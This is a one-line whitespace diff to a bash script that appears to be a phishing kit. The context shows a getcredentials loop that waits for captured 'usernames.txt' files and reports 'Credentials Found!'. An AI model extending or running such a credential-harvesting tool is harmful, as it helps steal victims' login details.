@@ -268,7 +268,6 @@ getcredentials() {
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
   while [ true ]; do
     
-    
     if [[ -e "sites/$server/usernames.txt" ]]; then
       printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
       catch_cred
